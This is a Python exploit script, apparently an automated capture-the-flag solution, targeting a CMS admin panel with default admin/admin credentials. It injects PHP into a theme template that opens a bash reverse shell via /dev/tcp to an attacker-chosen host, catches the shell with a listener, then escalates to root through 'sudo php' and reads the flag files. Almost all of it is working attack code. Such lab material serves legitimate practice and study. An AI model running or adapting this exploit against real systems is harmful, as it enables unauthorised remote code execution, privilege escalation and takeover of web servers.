import requests
from urllib.parse import quote
import argparse
import socket
import telnetlib
from threading import Thread
import urllib3
import bs4

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



######################################################################## MY SETUP ############################################################



# My session setup
session = requests.Session()
session.verify = False
header = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0"}

# Interface class to display terminal messages
class Interface:
    def __init__(self):
        self.red = "\033[91m"
        self.green = "\033[92m"
        self.white = "\033[37m"
        self.yellow = "\033[93m"
        self.bold = "\033[1m"
        self.end = "\033[0m"

    def info(self, message):
        print(f"({self.white}*{self.end}) {message}")

    def warning(self, message):
        print(f"({self.yellow}!{self.end}) {message}")

    def error(self, message):
        print(f"({self.red}x{self.end}) {message}")

    def success(self, message):
        print(f"({self.green}✓{self.end}) {self.bold}{message}{self.end}")

def do_POST(url, headers={}, cookies={}, data=None, isJSON=False):
    headers["User-Agent"] = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
    )
    if isJSON:
        headers["Content-type"] = "application/json"
    else:
        headers["Content-type"] = "application/x-www-form-urlencoded"
    if data is not None:
        if isJSON:
            r = session.post(
                url, headers=headers, cookies=cookies, json=data, allow_redirects=False
            )
        else:
            r = session.post(
                url, headers=headers, cookies=cookies, data=data, allow_redirects=False
            )
    else:
        r = session.post(url, headers=headers, cookies=cookies, allow_redirects=False)
    return r


def do_GET(url, headers={}, cookies={}, data=None):
    r = session.get(url, headers=headers, cookies=cookies, allow_redirects=False, data=data)
    return r


def exec_code(listen_port):
    handlerthr = Thread(target=handler, args=(listen_port,))
    handlerthr.start()


def handler(listen_port):
    user_flag = ""
    system_flag = ""
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", int(listen_port)))
    s.listen(1)
    conn, addr = s.accept()
    t.sock = conn
    t.sock.send(b"cat /home/mrb3n/user.txt\n")
    for i in range(3):
        user_flag = user_flag + t.sock.recv(2048).decode()
    output.success("User flag: " + user_flag.split("\n")[3])
    t.sock.send(b'''sudo php -r 'system("/bin/bash");'\n''')
    t.sock.send(b"cat /root/root.txt\n")
    for i in range(3):
        system_flag = system_flag + t.sock.recv(2048).decode()
    output.success("System flag: " + system_flag.split("\n")[1])




######################################################################## MY SETUP ############################################################


def login(hostname, username, password):
    do_POST(url=hostname + "/admin/index.php",data=f"userid={username}&pwd={password}&submitted=Login", headers=header)

def change_content(hostname, listen_host, listen_port):

    req = do_GET(url=hostname + "/admin/theme-edit.php?t=Innovation&f=template.php", headers=header).content
    soup = bs4.BeautifulSoup(req, 'html.parser')
    nonce_element = soup.find('input', id='nonce')
    if nonce_element:
        nonce_value = nonce_element['value']
    else:
        exit(output.error("Nonce element not found in the HTML."))
    do_POST(url=hostname + "/admin/theme-edit.php?t=Innovation&f=template.php", data=f'''nonce={nonce_value}&content=<%3fphp+exec("/bin/bash+-c+'bash+-i+>%26+/dev/tcp/{listen_host}/{listen_port}+0>%261'")%3b&edited_file=Innovation%2Ftemplate.php&submitsave=Save+Changes''', headers=header)

def trigger_shell_and_get_flag(hostname, listen_port):
    exec_code(listen_port)
    do_GET(url=hostname + "/theme/Innovation/template.php", headers=header)




if __name__ == "__main__":
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u", "--url", help="Target ip address or hostname", required=True
    )
    parser.add_argument(
        "-l", "--lhost", help="Listening IP address for reverse shell", required=True
    )
    parser.add_argument(
        "-p", "--lport", help="Listening port for reverse shell", required=True
    )
    parser.add_argument(
        "-d",
        "--debug",
        help="Instruct our web requests to use our defined proxy",
        action="store_true",
        required=False,
    )
    args = parser.parse_args()

    target_url = args.url
    lhost = args.lhost
    lport = args.lport
    if args.debug:
        session.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }

    # Instantiate our interface class
    global output
    output = Interface()

    login(target_url, "admin", "admin")
    change_content(target_url, lhost, lport)
    trigger_shell_and_get_flag(target_url, lport)